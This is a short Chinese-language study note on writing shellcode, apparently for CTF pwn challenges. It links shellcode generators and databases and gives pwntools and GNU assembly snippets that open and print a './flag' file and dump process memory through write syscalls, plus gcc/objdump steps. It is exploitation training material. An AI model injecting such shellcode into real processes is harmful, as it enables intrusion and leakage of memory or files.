---
title: shellcode 汇编
updated: 2022-08-23T15:28:12.0000000+08:00
created: 2021-12-03T20:06:00.0000000+08:00
---

## 自动生成
- <http://shell-storm.org/shellcode/>
- [Exploit Database Shellcodes (exploit-db.com)](https://www.exploit-db.com/shellcodes)
### msfvenom
### shell-storm
### pwntools
[纯字符shellcode生成指南 \| TaQini](http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode)

## 原理（见ROP）
## 汇编代码参考
## 编写
[Compiler Explorer (godbolt.org)](https://godbolt.org/) 在线生成汇编码
### 用pwntools编写（功能不全，不支持相对跳转）

shellcode = shellcraft.open('./flag')

shellcode += shellcraft.read('eax','esp',0x30)

shellcode += shellcraft.write(1,'esp',0x30)

code = asm(shellcode)

offset = 0x1248

sc = """

mov rdi, 1

mov rsi, 0x402000

mov rdx, 0x20

mov rax, 1

syscall

mov rsi,rcx

sub rsi,{}

mov rbx, 0

mov rdi, 1

mov rdx, 0x80

mov rax, 1

syscall

sub rsi,0x1000

add rbx, 1

cmp rbx,0xffff

""".format(offset)

sd(asm(sc)+b'\x7e\xd5')

mov edx, DWORD PTR \[esi\]

（反汇编是disasm(b'\xb8\x0b\x00\x00\x00'))

[pwnlib.asm — Assembler functions — pwntools 4.7.0 documentation](https://docs.pwntools.com/en/stable/asm.html?highlight=disassemble#disassembly)
### gcc编译再反汇编
**gcc -c code.s**

**objdump -d code.o \>code.d**

.global \_start

.text

\_start:

mov \$1, %rdi

mov \$0x402000, %rsi

mov \$0x20, %rdx

mov \$1, %rax

syscall

mov %rcx, %rsi

sub \$0x1248, %rsi

mov \$0, %rbx

loooop:

mov \$1, %rdi

mov \$0x20, %rdx

mov \$1, %rax

syscall

sub \$0x1000, %rsi

add \$1, %rbx

cmp \$0xfff, %rbx

jle loooop
###  keystone-engine
